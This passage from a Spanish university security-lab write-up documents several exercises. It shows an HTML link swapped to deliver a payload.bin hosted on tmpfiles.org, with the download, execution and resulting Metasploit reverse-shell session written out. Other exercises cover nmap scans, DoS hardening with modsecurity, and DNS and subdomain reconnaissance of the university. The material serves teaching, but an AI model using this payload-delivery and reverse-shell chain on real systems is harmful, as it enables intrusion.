            margin: 0 auto;
            width: auto;
        }
    }
    </style>
</head>

<body>
<div>
    <h1>Example Domain</h1>
    <p>This domain is for use in illustrative examples in documents. You may use this
    domain in literature without prior coordination or asking for permission.</p>
    <p><a href="https://tmpfiles.org/dl/207895/payload.bin">="https://www.iana.org/domains/example">More
```

> Vemos que en la última linea la víctima tiene el `payload.bin`.

4. Después de ejecutar el payload obtenemos un reverse shell en el atacante:

```bash
root@debian:/home/lsi# msfconsole
                                                  
Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v6.2.25-dev-                         ]
+ -- --=[ 2261 exploits - 1188 auxiliary - 402 post       ]
+ -- --=[ 948 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the 
last opened session
Metasploit Documentation: https://docs.metasploit.com/

msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.11.48.50
LHOST => 10.11.48.50
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.11.48.50:4444 
[*] Sending stage (36 bytes) to 10.11.49.106
[*] Command shell session 1 opened (10.11.48.50:4444 -> 10.11.49.106:56054) at 2022-11-03 13:55:42 +0100


ls
Descargas
Documentos
Escritorio
Imágenes
Música
Plantillas
Público
Vídeos
etcinitd
mbox
ossec-hids-3.7.0
ossec-hids-3.7.0.zip
payload.bin
scripts
echo h4ck3d > h4ck3d.txt
cat h4ck3d.txt
h4ck3d
exit
[*] 10.11.49.106 - Command shell session 1 closed.
msf6 exploit(multi/handler) > exit
```

En la máquina de la víctima simulamos una descarga del href introducido:

```bash
root@debian:/home/lsi# wget https://tmpfiles.org/dl/207895/payload.bin
--2022-11-03 13:49:32--  https://tmpfiles.org/dl/207895/payload.bin
Resolving tmpfiles.org (tmpfiles.org)... 104.21.21.16, 172.67.195.247, 2606:4700:3030::6815:1510, ...
Connecting to tmpfiles.org (tmpfiles.org)|104.21.21.16|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 207 [application/x-executable]
Saving to: 'payload.bin'

payload.bin                                  100%[============================================================================================>]     207  --.-KB/s    in 0s

2022-11-03 13:49:33 (215 MB/s) - 'payload.bin' saved [207/207]

root@debian:/home/lsi# file payload.bin
payload.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header
root@debian:/home/lsi# chmod +x payload.bin
root@debian:/home/lsi# ./payload.bin
root@debian:/home/lsi# ls
 Descargas    Escritorio	     'M'$'\303\272''sica'  'P'$'\303\272''blico'   etcinitd     hola.txt   ossec-hids-3.7.0	  payload.bin
 Documentos  'Im'$'\303\241''genes'   Plantillas	   'V'$'\303\255''deos'    h4ck3d.txt   mbox	   ossec-hids-3.7.0.zip   scripts
root@debian:/home/lsi# cat h4ck3d.txt
h4ck3d
```

### Apartado H

Haga un MITM en IPv6 y visualice la paquetería.

 ```bash
 
 ```

### Apartado I

Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).

- Vaciar arp: `ip -s -s neigh flush all`

```bash
root@debian:/home/lsi# cat /etc/arpon.conf 
#
# ArpON configuration file.
#
# See the arpon(8) man page for details.
#
#
# Static entries matching the ens33 network interface:
#
10.11.48.1	dc:08:56:10:84:b9
10.11.49.106	00:50:56:97:24:d0
root@debian:/home/lsi# arpon -d -i ens33 -H
root@debian:/home/lsi# Nov 03 16:44:03 [INFO] Background process is running (3514).

root@debian:/home/lsi# ps -A | grep arpon
   3514 ?        00:00:00 arpon
root@debian:/home/lsi# kill 3514
```

### Apartado J

Pruebe distintas técnicas de host discovery, port scanning y OS fingerprinting sobre la máquinas del laboratorio de prácticas en IPv4.

```bash
root@debian:/home/lsi# nmap -A 10.11.48.0/23 > nmap_full.txt
```

```
root@debian:/home/lsi# cat nmap_full.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-03 14:33 CET
Nmap scan report for 10.11.48.1
Host is up (0.00084s latency).
All 1000 scanned ports on 10.11.48.1 are filtered
MAC Address: DC:08:56:10:84:B9 (Alcatel-Lucent Enterprise)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.84 ms 10.11.48.1

Nmap scan report for 10.11.48.3
Host is up (0.00018s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  http       Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: 403 Forbidden
MAC Address: 00:50:56:97:2C:BF (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/3%OT=80%CT=1%CU=31413%PV=Y%DS=1%DC=D%G=Y%M=005056%T
OS:M=6363C655%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.18 ms 10.11.48.3

Nmap scan report for 10.11.48.16
Host is up (0.00029s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:50:56:97:2C:AD (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
...
...
HOP RTT     ADDRESS
1   0.16 ms 10.11.49.165

Nmap scan report for debian (10.11.48.50)
Host is up (0.000039s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE    VERSION
22/tcp  open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp  open  http       Apache httpd 2.4.54 ((Debian))
|_http-title: \xC3\x81lvaro Freire \xE2\x80\x94 Software Developer
514/tcp open  shell?
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 0 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 512 IP addresses (190 hosts up) scanned in 2190.24 seconds
```

Realice alguna de las pruebas de port scanning sobre IPv6.

```bash
root@debian:/home/lsi# nmap -A -6 fe80::250:56ff:fe97:d0a2
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-01 16:26 CET
Nmap scan report for fe80::250:56ff:fe97:d0a2
Host is up (0.00021s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  tcpwrapped
MAC Address: 00:50:56:97:D0:A2 (VMware)
No OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=6%D=11/1%OT=22%CT=1%CU=41679%PV=N%DS=1%DC=D%G=Y%M=005056%
OS:TM=63613AB9%P=x86_64-pc-linux-gnu)S1(P=6003948d00280640XX{32}001688c74e
OS:ae89ecdf2772d1a012fb04e6470000020405a00402080a692ff6c9ff{4}01030307%ST=
OS:0.010048%RT=0.010437)S2(P=60034ee600280640XX{32}001688c8b3a8f194df2772d
OS:2a012fb04193f0000020405a00402080a692ff72dff{4}01030307%ST=0.110036%RT=0
OS:.11041)S3(P=6002427d00280640XX{32}001688c9f6d18678df2772d3a012fb0443cd0
OS:000020405a00101080a692ff791ff{4}01030307%ST=0.210144%RT=0.210517)S4(P=6
OS:00b20ee00280640XX{32}001688ca805d481adf2772d4a012fb04f5380000020405a004
OS:02080a692ff7f5ff{4}01030307%ST=0.310055%RT=0.310498)S5(P=6009e8ae002806
OS:40XX{32}001688cbebbe4e6ddf2772d5a012fb04831e0000020405a00402080a692ff85
OS:9ff{4}01030307%ST=0.41007%RT=0.410441)S6(P=6009b42000240640XX{32}001688
OS:cc3fc1c1f4df2772d69012fb04cf3c0000020405a00402080a692ff8bdff{4}%ST=0.51
OS:006%RT=0.510419)IE1(P=60038e6000803a40XX{32}81097f21abcd00{122}%ST=0.55
OS:0661%RT=0.550898)IE2(P=600c816500583a40XX{32}0401807900{3}3860012345002
OS:80035XX{32}3c00010400{4}2b00010400{12}3a00010400{4}800080a1abcd0001%ST=
OS:0.600211%RT=0.600478)NS(P=6000{4}183affXX{32}8800bd544000{3}XX{16}%ST=0
OS:.649789%RT=0.649996)U1(P=6008c1d101643a40XX{32}010415b600{4}60012345013
OS:41125XX{32}884fa2cf013415b143{300}%ST=0.699269%RT=0.699519)TECN(P=600fc
OS:73e00200640XX{32}001688cd0c0f4f0ddf2772d78052fd20e8680000020405a0010104
OS:0201030307%ST=0.749789%RT=0.750115)T4(P=6006ffac00140640XX{32}001688d04
OS:2f4eccd00{4}50040000a3eb0000%ST=0.897937%RT=0.898193)T5(P=6008762a00140
OS:640XX{32}000188d100{4}df2772db5014000081ae0000%ST=0.94746%RT=0.947712)T
OS:6(P=6001e65100140640XX{32}000188d2b7a43dd400{4}50040000de470000%ST=0.99
OS:6988%RT=0.997269)T7(P=6008eff300140640XX{32}000188d300{4}df2772dd501400
OS:0081aa0000%ST=1.04654%RT=1.04678)EXTRA(FL=12345)

Network Distance: 1 hop

Host script results:
| address-info: 
|   IPv6 EUI-64: 
|     MAC address: 
|       address: 00:50:56:97:d0:a2
|_      manuf: VMware

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms fe80::250:56ff:fe97:d0a2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds
```

¿Coinciden los servicios prestados por un sistema con los de IPv4?

En este caso sí. Puertos 22 y 514.

### Apartado K

Obtenga información "en tiempo real" sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.

```bash
root@debian:/home/lsi# iftop -i ens33
                    12,5Kb              25,0Kb              37,5Kb              50,0Kb         62,5Kb
└───────────────────┴───────────────────┴───────────────────┴───────────────────┴────────────────────
debian                               => 10.11.49.55                           33,6Kb  6,72Kb  2,59Kb
                                     <=                                       37,3Kb  7,45Kb  2,87Kb
debian                               => 10.30.10.165                           800b    890b   1,65Kb
                                     <=                                        208b    208b    400b
debian                               => sol.udc.pri                            280b     56b     65b
                                     <=                                        576b    115b    118b



─────────────────────────────────────────────────────────────────────────────────────────────────────
TX:             cum:   14,0KB   peak:   34,7Kb                       rates:   34,7Kb  7,65Kb  4,30Kb
RX:                    11,0KB           38,0Kb                                38,0Kb  7,77Kb  3,37Kb
TOTAL:                 24,9KB           72,7Kb                                72,7Kb  15,4Kb  7,67Kb
```

```bash
root@debian:/home/lsi# vnstat -l -i ens33
Monitoring ens33...    (press CTRL-C to stop)

   rx:       504 bit/s     1 p/s          tx:       728 bit/s     0 p/s^C


 ens33  /  traffic statistics

                           rx         |       tx
--------------------------------------+------------------
  bytes                   123,24 KiB  |       60,70 KiB
--------------------------------------+------------------
          max          206,90 kbit/s  |    46,75 kbit/s
      average            7,01 kbit/s  |     3,45 kbit/s
          min              264 bit/s  |         0 bit/s
--------------------------------------+------------------
  packets                       2096  |             983
--------------------------------------+------------------
          max                431 p/s  |         107 p/s
      average                 14 p/s  |           6 p/s
          min                  0 p/s  |           0 p/s
--------------------------------------+------------------
  time                  2,40 minutes

```

### Apartado L

PARA PLANTEAR DE FORMA TEÓRICA:

¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas?

¿Y mediante un DoS de tipo reflective flooding attack?

> Adistributed denial-of-service attack may involve sending forged requests of some type to a very large number of computers that will reply to the requests. Using Internet Protocol address spoofing, the source address is set to that of the targeted victim, which means all the replies will go to (and flood) the target. (This reflected attack form is sometimes called a "DRDOS".\[66])

### Apartado M

Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7).

```bash
root@debian:/home/lsi# apt install apache2
...
root@debian:/home/lsi# curl https://www.alvarofreire.es/ > /var/www/html/index.html
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9341  100  9341    0     0  56612      0 --:--:-- --:--:-- --:--:-- 56957
```

```bash

```

archivo slowhttp.html:

- ª

¿Cómo podría proteger dicho servicio ante este tipo de ataque?

¿Y si se produjese desde fuera de su segmento de red?

¿Cómo podría tratar de saltarse dicha protección?


### Apartado N

Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?

```bash
root@debian:/home/lsi# apt install libapache2-mod-security2
...
root@debian:/home/lsi# a2enmod headers
Enabling module headers.
To activate the new configuration, you need to run:
  systemctl restart apache2
root@debian:/home/lsi# systemctl restart apache2
root@debian:/home/lsi# cp /etc/modsecurity/modsecurity.conf-recommended app
root@debian:/home/lsi# nano /etc/modsecurity/modsecurity.conf
# Enable ModSecurity, attaching it to every transaction. Use detection
# only to start with, because that minimises the chances of post-installation
# disruption.
#
SecRuleEngine On
```

> Change `SecRuleEngine` from `DetectionOnly` to `On`

```bash
root@debian:/home/lsi# apt install libapache2-mod-evasive
root@debian:/home/lsi# a2enmod evasive
root@debian:/home/lsi# cat /etc/apache2/mods-enabled/evasive.conf 
<IfModule mod_evasive20.c>
    #DOSHashTableSize    3097
    DOSPageCount        1
    DOSSiteCount        1
    
    DOSPageInterval     1
    DOSSiteInterval     2
    
    DOSBlockingPeriod   300

    #DOSEmailNotify      you@yourdomain.com
    #DOSSystemCommand    "su - someuser -c '/sbin/... %s ...'"
    #DOSLogDir           "/var/log/mod_evasive"
</IfModule>
```

### Apartado O

Buscamos información:

- Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.

> `whois` está capado desde la máquina virtual, pero desde mi máquina ejecuto:

```zsh
╭─alvarofreire at alvaro-msi in ~ 22-11-01 - 16:56:21
╰─○ whois -h whois.ripe.net UDC
% This is the RIPE Database query service.
% The objects are in RPSL format.
%
% The RIPE Database is subject to Terms and Conditions.
% See http://www.ripe.net/db/support/db-terms-conditions.pdf

% Note: this output has been filtered.
%       To receive output for a database update, use the "-B" flag.

% Information related to '193.144.48.0 - 193.144.63.255'

% Abuse contact for '193.144.48.0 - 193.144.63.255' is 'iris@certsi.es'

inetnum:        193.144.48.0 - 193.144.63.255
netname:        UDC
descr:          Universidade da Coru~na
descr:          Rede de Comunicacions
country:        ES
admin-c:        JFA10-RIPE
tech-c:         JFA10-RIPE
abuse-c:        RIAC2-RIPE
status:         ASSIGNED PA
mnt-irt:        IRT-IRIS
remarks:        mail spam reports: iris@certsi.es
remarks:        security incidents: iris@certsi.es
mnt-by:         REDIRIS-NMC
created:        1970-01-01T00:00:00Z
last-modified:  2017-12-11T13:59:57Z
source:         RIPE # Filtered

person:         Javier Farinas Alvarino
address:        Rede de Comunicacións
address:        Servizo de Informatica e Comunicacions
address:        Edificio de Servizos Centrais de Investigacion
address:        Campus de Elvina
address:        Universidade da Coruna
address:        E - 15071 - A Coruna
address:        SPAIN
phone:          +34 981167000 ext. 1199
nic-hdl:        JFA10-RIPE
mnt-by:         REDIRIS-NMC
created:        2010-01-26T08:16:45Z
last-modified:  2017-10-30T22:08:05Z
source:         RIPE # Filtered

% Information related to '193.147.32.0 - 193.147.41.255'

% Abuse contact for '193.147.32.0 - 193.147.41.255' is 'iris@certsi.es'

inetnum:        193.147.32.0 - 193.147.41.255
netname:        UDC
descr:          Universidade da Coru~na
descr:          Rede de Comunicacions
country:        ES
admin-c:        JFA10-RIPE
tech-c:         JFA10-RIPE
abuse-c:        RIAC2-RIPE
status:         ASSIGNED PA
mnt-irt:        IRT-IRIS
remarks:        mail spam reports: iris@certsi.es
remarks:        security incidents: iris@certsi.es
mnt-by:         REDIRIS-NMC
created:        1970-01-01T00:00:00Z
last-modified:  2017-12-11T14:00:12Z
source:         RIPE # Filtered

person:         Javier Farinas Alvarino
address:        Rede de Comunicacións
address:        Servizo de Informatica e Comunicacions
address:        Edificio de Servizos Centrais de Investigacion
address:        Campus de Elvina
address:        Universidade da Coruna
address:        E - 15071 - A Coruna
address:        SPAIN
phone:          +34 981167000 ext. 1199
nic-hdl:        JFA10-RIPE
mnt-by:         REDIRIS-NMC
created:        2010-01-26T08:16:45Z
last-modified:  2017-10-30T22:08:05Z
source:         RIPE # Filtered

% Information related to '2001:720:121c::/48'

% Abuse contact for '2001:720:121c::/48' is 'iris@certsi.es'

inet6num:       2001:720:121c::/48
netname:        UDC
descr:          Universidad de La Corunna
descr:          La Corunna
country:        ES
admin-c:        JFA32-RIPE
tech-c:         JFA32-RIPE
abuse-c:        RIAC2-RIPE
status:         ASSIGNED
mnt-by:         REDIRIS-NMC
mnt-irt:        IRT-IRIS
created:        2011-05-16T08:32:59Z
last-modified:  2017-12-11T14:00:14Z
source:         RIPE # Filtered

person:         Javier Farinnas Alvarinno
address:        Universidad de La Coruña
address:        c/ Maestranza, 9
address:        E-15001 La Coruña
address:        SPAIN
phone:          +34 981167199
fax-no:         +34 981167172
nic-hdl:        JFA32-RIPE
mnt-by:         REDIRIS-NMC
created:        2011-05-16T08:32:59Z
last-modified:  2017-10-30T22:13:47Z
source:         RIPE # Filtered

% This query was served by the RIPE Database Query Service version 1.104 (WAGYU)
```

- Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña.

```zsh
╭─alvarofreire at alvaro-msi in ~ 22-11-01 - 17:00:35
╰─○ dig udc.es MX

; <<>> DiG 9.18.1-1ubuntu1.2-Ubuntu <<>> udc.es MX
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 36525
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;udc.es.				IN	MX

;; ANSWER SECTION:
udc.es.			3600	IN	MX	10 udc-es.mail.protection.outlook.com.

;; Query time: 72 msec
;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
;; WHEN: Tue Nov 01 17:00:41 CET 2022
;; MSG SIZE  rcvd: 85

╭─alvarofreire at alvaro-msi in ~ 22-11-01 - 17:00:41
╰─○ dig udc.es NS 

; <<>> DiG 9.18.1-1ubuntu1.2-Ubuntu <<>> udc.es NS
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 15866
;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 6

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;udc.es.				IN	NS

;; ANSWER SECTION:
udc.es.			14400	IN	NS	zape.udc.es.
udc.es.			14400	IN	NS	zipi.udc.es.
udc.es.			14400	IN	NS	chico.rediris.es.
udc.es.			14400	IN	NS	sun.rediris.es.

;; ADDITIONAL SECTION:
sun.rediris.es.		26841	IN	A	199.184.182.1
sun.rediris.es.		4600	IN	AAAA	2620:171:808::1
zape.udc.es.		13962	IN	AAAA	2001:720:121c:e000::102
chico.rediris.es.	25333	IN	A	162.219.54.2
chico.rediris.es.	5651	IN	AAAA	2620:10a:80eb::2

;; Query time: 88 msec
;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
;; WHEN: Tue Nov 01 17:01:02 CET 2022
;; MSG SIZE  rcvd: 235
```

- ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?

No, tiene la transferencia de zona deshabilitada:

```zsh
╭─alvarofreire at alvaro-msi in ~ 22-11-01 - 17:01:44
╰─○ dig axfr @zipi.udc.es udc.es.

; <<>> DiG 9.18.1-1ubuntu1.2-Ubuntu <<>> axfr @zipi.udc.es udc.es.
; (2 servers found)
;; global options: +cmd
; Transfer failed.
```

- En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.

```bash
root@debian:/home/lsi# nmap --script hostmap-crtsh.nse udc.es
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-01 17:05 CET
Nmap scan report for udc.es (193.144.53.84)
Host is up (0.00064s latency).
Other addresses for udc.es (not scanned): 2001:720:121c:e000::203
Not shown: 998 filtered ports
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Host script results:
| hostmap-crtsh: 
|   subdomains: 
|     lpnmr2013.udc.es
|     www.gtec.udc.es
|     jitel21.udc.es
|     eurosci.udc.es\nwww.eurosci.udc.es
|     hercules.udc.es
|     caminos.udc.es
|     backend.campus-suds.udc.es
|     radius.udc.es
|     cemi.udc.es
|     contubernio.tic.udc.es
|     solaria.dc.fi.udc.es
|     artistica.udc.es
|     campus-suds.udc.es
|     npm.campus-suds.udc.es
|     admin.campus-suds.udc.es
|     nas.gtec.udc.es
|     coloso.dc.fi.udc.es
|     gcd.udc.es\nwww.gcd.udc.es
|     centinela.udc.es
|     clepito.udc.es
|     latex.gtec.udc.es
|     xnas.gtec.udc.es
|     telmo.udc.es
|     debauthn.tic.udc.es
|     vi216.udc.es
|     iala.udc.es
|     etsa.udc.es\niacobusplus.udc.es\nwww.iacobusplus.udc.es
|     inefg.udc.es
|     ciencias.udc.es
|     euat.udc.es
|     vios.dc.fi.udc.es
|     culombio.udc.es
|     humanidades.udc.es
|     cdah.humanidades.udc.es
|     filo247.udc.es
|     pangea.udc.es
|     data.gtec.udc.es
|     lim.ii.udc.es
|     consellosocial.udc.es\nwww.consellosocial.udc.es
|     dpauc.udc.es\nwww.dpauc.udc.es
|     hexa.gtec.udc.es
|     proaclim.udc.es
|     paisaje.udc.es
|     dm.udc.es
|     ftp.udc.es
|     pcmecanismos.eps.cdf.udc.es
|     mura.master.blog.udc.es
|     jenui2022.udc.es
|     radon.citeec.udc.es
|     iot.gtec.udc.es
|     smtp2.udc.es
|     inmotion.udc.es
|     deploy.fic.udc.es
|     gitlab.fic.udc.es
|     redmine.fic.udc.es
|     sonar.fic.udc.es
|     jenkins.fic.udc.es
|     vi220.udc.es
|     tmp.campus-suds.udc.es
|     www.educacion.udc.es
|     fee.udc.es
|     dante.dec.udc.es
|     docencia.lbd.udc.es
|     vi214.udc.es
|     app.rnasa-imedir.udc.es
|     merlin.udc.es
|     uptodateinternacional.udc.es
|     eaetx.udc.es
|     cifcyt.udc.es
|     sil.dc.fi.udc.es
|     guisamo.des.udc.es
|     lbd.udc.es
|     illa.udc.es\nwww.illa.udc.es
|     bvg.udc.es
|     pon.tic.udc.es
|     200.dm.fi.udc.es
|     vi141.udc.es
|     www.eudi.udc.es
|     campusvirtual.udc.es
|     citeni.udc.es
|     gii.udc.es\nwww.gii.udc.es
|     aesla2020.udc.es
|     infoguias.biblioteca.udc.es
|     agrupacionciteec.udc.es\nwww.agrupacionciteec.udc.es
|     sociologia.udc.es\nwww.sociologia.udc.es
|     mujeresvideojuegos.udc.es
|     campusindustrial.udc.es
|     smtp3.udc.es
|     novas.udc.es\nudc.es\nwww.udc.es
|     *.xescampus.udc.es
|     servizos.centros.udc.es
|     documenta.udc.es
|     *.sic.udc.es
|     *.sai.udc.es
|     *.citic.udc.es\ncitic.udc.es
|     gcd.udc.es
|     *.accedys.udc.es\naccedys.udc.es
|     kmelot.biblioteca.udc.es
|     economicas.udc.es\nwww.economicas.udc.es
|     aiplus.udc.es
|     impresion.eps.udc.es
|     cerbero.tic.udc.es
|     gie.udc.es
|     catedra.handytronic.fic.udc.es
|     imedir.udc.es\nwww.imedir.udc.es
|     authtv.udc.es\ndestv.udc.es\nlive.udc.es\nnakedpretv.udc.es\nocadmin.udc.es\nocengage.udc.es\nocingest.udc.es\npreauthtv.udc.es\npredestv.udc.es\nprelive.udc.es\npreocadmin.udc.es\npreocengage.udc.es\npretv.udc.es
|     soc34.udc.es
|     comunicacion.udc.es
|     udcportal.udc.es
|     nac.udc.es
|     *.xrede.udc.es
|     masterciencias.udc.es
|     mx2.udc.es
|     listas.udc.es
|     adfs.udc.es
|     www.gcd.udc.es
|     filo249.udc.es
|     citeec.udc.es
|     www.citeec.udc.es
|     videalab.udc.es
|     vac.udc.es
|     sbc-1.udc.es
|     cica.udc.es
|     guasom.citic.udc.es
|     memoriarsu.udc.es\nwww.memoriarsu.udc.es
|     udc.es\nwww.udc.es
|     *.pruebasaccedys.udc.es\npruebasaccedys.udc.es
|     www.dc.fi.udc.es
|     catalogo-publicacions.udc.es
|     masterturismo.udc.es
|     mias.udc.es
|     vices.udc.es
|     *.vdi.udc.es\nvdi.udc.es
|     servidorbim.euat.udc.es\nwww.servidorbim.euat.udc.es
|     bim.udc.es\nwww.bim.udc.es
|     nauticaemaquinas.udc.es\nwww.nauticaemaquinas.udc.es
|     ftp.iuem.udc.es\niuem.udc.es
|     iuem.udc.es
|     rtls.gtec.udc.es
|     pretv.udc.es
|     nakedpretv.udc.es
|     preauthtv.udc.es
|     ndn.gtec.udc.es
|     siem.seguridade.udc.es
|     incude.udc.es
|     premiosconsellosocial.udc.es
|     hiperform.gtec.udc.es
|     ale.gtec.udc.es
|     ftpweb.udc.es
|     www.gcons.udc.es
|     pluton.dec.udc.es\npluton.des.udc.es
|     nas.talionis.udc.es
|     nas.gcons.udc.es
|     gis.gac.udc.es\nwww.gis.gac.udc.es
|     gis.gac.udc.es
|     adcim.des.udc.es\nbdev.des.udc.es\nbdwatchdog.dec.udc.es\nbplg.des.udc.es\ncpc2006.des.udc.es\ncppc.des.udc.es\ndec.udc.es\ndepspawn.des.udc.es\ndes.udc.es\nflamemr.des.udc.es\ngac.des.udc.es\ngac.udc.es\nghpc.udc.es\nhpl.des.udc.es\nhsra.dec.udc.es\njfs.des.udc.es\nmardre.des.udc.es\nmrev.des.udc.es\npdp2004.des.fi.udc.es\nservet.des.udc.es\nsimula3ms.des.udc.es\nupcblas.des.udc.es\nwww.dec.udc.es\nwww.des.udc.es\nwww.gac.udc.es
|     correcaminos2.udc.es
|     cartolab.udc.es
|     cartolab2.udc.es\nwww.cartolab2.udc.es
|     box.gcons.udc.es\nwww.box.gcons.udc.es
|     ofertatec.udc.es\notri.udc.es\nwww.intalent.udc.es
|     escaner.seguridade.udc.es\nwww.escaner.seguridade.udc.es
|     opendata.citic.udc.es
|     pedrasbrancas.des.udc.es
|     tecafyd.inef.udc.es\nwww.tecafyd.inef.udc.es
|     doctoradosalud.udc.es\nwww.doctoradosalud.udc.es
|     posgrado.bim.udc.es\nwww.posgrado.bim.udc.es
|     probasinefgalicia.udc.es\nwww.probasinefgalicia.udc.es
|     cit.udc.es\nwww.cit.udc.es
|     fundacion.udc.es\nwww.fundacion.udc.es
|     wiki.gtec.udc.es
|     vpn.udc.es
|     mastermais.udc.es\nwww.mastermais.udc.es
|     master.bioinformatica.fic.udc.es\nwww.master.bioinformatica.fic.udc.es
|     geriatic.udc.es\nwww.geriatic.udc.es
|     cursosccr.regicc.udc.es\nwww.cursosccr.regicc.udc.es
|     rnasa-imedir.udc.es\nwww.rnasa-imedir.udc.es
|     *.fic.udc.es\nfic.udc.es
|     sabia.tic.udc.es\nwww.sabia.tic.udc.es
|     cei.udc.es\nwww.cei.udc.es
|     rascuco.udc.es\nwww.rascuco.udc.es
|     umi.udc.es\nwww.umi.udc.es
|     eps.udc.es\nwww.eps.udc.es
|     *.udc.es\nudc.es
|     aesla2020.udc.es\nwww.aesla2020.udc.es
|     talionis.citic.udc.es\nwww.talionis.citic.udc.es
|     doctoradociencias.udc.es\nwww.doctoradociencias.udc.es
|     radius.udc.es\nwww.radius.udc.es
|     cloudpatient.udc.es\nwww.cloudpatient.udc.es
|     intalent.udc.es\nwww.intalent.udc.es
|     ofertatec.udc.es\nwww.ofertatec.udc.es
|     otri.udc.es\nwww.otri.udc.es
|     proaclim.udc.es\nwww.proaclim.udc.es
|     pangea.udc.es\nwww.pangea.udc.es
|     ojo.citeec.udc.es\nradon.citeec.udc.es\ntreboada.citeec.udc.es
|     mujeresvideojuegos.udc.es\nwww.mujeresvideojuegos.udc.es
